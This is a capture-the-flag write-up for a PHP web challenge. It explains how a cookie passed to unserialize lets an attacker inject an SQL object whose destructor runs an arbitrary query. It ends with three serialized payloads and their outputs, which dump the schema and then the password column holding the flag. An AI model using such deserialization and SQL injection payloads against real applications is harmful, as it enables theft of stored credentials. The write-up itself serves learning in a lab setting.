Firstly because the challange said something about a not so good implementation of a garbage collector I instantly looked at the desctruct function.


```
public function destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
```


Now I saw that unlike the "legit" way the code tried to query for an id, the desctruct function doesn't sanetize the input with is_numeric.


```
if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
```


So I needed a way to reach the desctruct function, and have a SQL object with a query parameter that will get deconstructed and executed.

I then saw that the the code the first time you load it up, it initializes a "leet_hax0r" cookies with it's remote address in it that expires in a month.
If that IP in the cookie is tampered with, the code sees that and sends you to a die('CANT HACK US!!!').
I knew that must be it, I need to tamper with the IP, get sent to die and then the SQL object will be destructed and my injected query would run.
The problem is the query parameter at the time of me reaching the die function is still not initialized with my user-input
```
$sql->query = 'SELECT username FROM users WHERE id=';
```

Then I found it, I researched about different functions in the code, and I stumbled upon a known vulnerability when passing user made objects into the unserialize function.
The exploit is that exactly how you can pass an array with the 'ip' in it that is checked by the code, you can pass objects as well.
Why is this bad? because those objects get destructed as well at the end of the execution.

important note:
in the payloads you must include the ip variable and make it be wrong, so you reach the die function, without it you don't reach the die function, the query parameter is then created with your user input and my pre-made object goes to the trash.

My payloads were as follows (pre base64 encoding):
input -> a:2:{s:2:"ip";s:7:"1.1.1.1";s:3:"sql";O:3:"SQL":1:{s:5:"query";s:60:"SELECT sql as username FROM sqlite_master WHERE name='users'";}}
output -> Username: CREATE TABLE users(id int, username varchar, password varchar)
input -> a:2:{s:2:"ip";s:7:"1.1.1.1";s:3:"sql";O:3:"SQL":1:{s:5:"query";s:56:"SELECT group_concat(name) as username FROM sqlite_master";}}
output -> Username: users
input -> a:2:{s:2:"ip";s:7:"1.1.1.1";s:3:"sql";O:3:"SQL":1:{s:5:"query";s:52:"SELECT group_concat(password) as username FROM users";}}
output -> Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}